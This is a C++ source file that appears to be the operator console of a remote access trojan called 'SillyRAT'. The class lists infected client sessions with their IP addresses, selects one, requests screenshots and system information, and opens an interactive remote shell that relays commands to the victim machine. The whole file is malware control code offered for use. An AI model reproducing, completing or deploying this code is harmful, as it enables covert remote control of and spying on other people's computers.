#include <iostream>
#include <string>
#include <cstring>
#include <map>
#include <vector>

using namespace std;

class INTERFACE{
private:
    string inputSv;
    string sockAddr;
    string current_address;
    int current_descriptor;
    int port;

    COLORS color;
    INPUT inputIf;
    SERVER *middle_face;

public:
    INTERFACE(){
        this->inputSv  = "";
        this->sockAddr = "0.0.0.0";
        this->port     = 54000;
    }
    INTERFACE(const string vala, const int valb){
        this->inputSv  = "";
        this->sockAddr = vala;
        this->port     = valb;
    }
    void setMiddleFace(SERVER *middle_face){
        this->middle_face = middle_face;
    }
    void listSessions(){
        std::map<int, std::string> sessions = this->middle_face->retClients();
        std::map<int, std::string>::iterator sessions_it;

        cout << endl;
        cout << color.BOLD << "   Descriptor   :      Ip Address  " << color.END << endl;
        
        for(sessions_it=sessions.begin(); sessions_it != sessions.end(); sessions_it++){
            cout << "   " << sessions_it->first << "            :      " <<sessions_it->second << endl;
        }

        cout << endl;
    }
    void operateSession(const string input_string){
        std::vector<std::string> words = color.split(input_string);
        std::map<int, std::string> sessions = this->middle_face->retClients();
        std::map<int, std::string>::iterator sessions_it;

        if(words.size() >= 2){
            for(sessions_it=sessions.begin(); sessions_it != sessions.end(); sessions_it++){
                if(to_string(sessions_it->first) == words[1]){
                    this->current_address    = sessions_it->second;
                    this->current_descriptor = sessions_it->first;
                    break;
                }
            }
        }else{
            cout << color.RED << "~ " << color.END << "Invalid Command!" << endl;
        }
    }
    void disconnectSession(){
        this->current_address = "";
        this->current_descriptor = 0;
    }
    void screenshotSession(){
        bool status = this->middle_face->sendData(current_descriptor, "screenshot");
        if(status){

        }
    }
    void sysinfoSession(){
        bool status = this->middle_face->sendData(current_descriptor, "sysinfo");
        if(status){

        }
    }
    void spawnShell(){
        string ii;
        bool status;

        cout << endl;
        cout << "# Shell v1.0. SillyRAT" << endl;
        while(true){
            cout << "# ";
            ii = this->inputIf.getInput();;

            if(ii == "exit"){
                cout << endl;
                break;
            }else{
                status = this->middle_face->sendData(current_descriptor, ii);
                if(status){
                    cout << this->middle_face->receiveData(current_descriptor);
                }else{
                    cout << "# Send Command failed!" << endl;
                }
            }   
        }
    }
    void engage(){
        while(true){
            color.showLiner(current_address, current_descriptor);
            this->inputSv = this->inputIf.getInput();

            if(this->inputSv == "exit"){
                break;
            }else if(this->inputSv == "help"){
                this->inputIf.getServerHelp();
            }else if(this->inputSv.rfind("sessions", 0) == 0){
                this->listSessions();
            }else if(this->inputSv.rfind("connect", 0) == 0){
                this->operateSession(this->inputSv);
            }else if(this->inputSv.rfind("disconnect", 0) == 0){
                this->disconnectSession();
            }else if(this->inputSv.rfind("screenshot", 0) == 0){
                this->screenshotSession();
            }else if(this->inputSv.rfind("sysinfo", 0) == 0){
                this->sysinfoSession();
            }else if(this->inputSv.rfind("shell", 0) == 0){
                this->spawnShell();
            }
        }
    }
};